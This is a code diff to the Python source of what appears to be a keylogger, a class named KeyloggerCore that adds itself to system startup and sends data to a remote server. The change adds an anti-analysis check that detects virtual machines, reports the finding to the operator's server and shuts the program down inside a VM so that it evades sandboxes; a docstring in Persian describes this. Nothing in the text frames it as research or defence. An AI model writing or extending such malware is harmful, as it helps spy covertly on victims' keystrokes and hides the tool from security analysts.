@@ -16,6 +16,7 @@ from PIL import Image
 import io
 import pyautogui
 import os
+from system.vm_detector import VMDetector
 
 # Configure logging based on DEBUG_MODE
 if Config.DEBUG_MODE:
@@ -48,7 +49,29 @@ class KeyloggerCore:
         self.communicator = ServerCommunicator(self.client_id, self.encryption)
         self.logger = ActivityLogger(Config.BUFFER_LIMIT)
         self.running = True
+
+        self.check_vm_environment()
+
         self.add_to_startup()
+
+    def check_vm_environment(self):
+        """
+        بررسی می‌کند که آیا برنامه روی VM اجرا می‌شود یا خیر و نتیجه را به سرور گزارش می‌دهد.
+        """
+        vm_details = VMDetector.get_vm_details()
+        if Config.DEBUG_MODE:
+            logging.info(f"VM Detection Details: {vm_details}")
+
+        try:
+            self.communicator.upload_vm_status(vm_details)
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to upload VM status: {str(e)}")
+
+        if vm_details["is_vm"] and not Config.DEBUG_MODE:
+            if Config.DEBUG_MODE:
+                logging.warning("Virtual Machine detected. Exiting in non-debug mode.")
+            self.emergency_stop()
 
     def start(self):
         self._init_hotkeys()
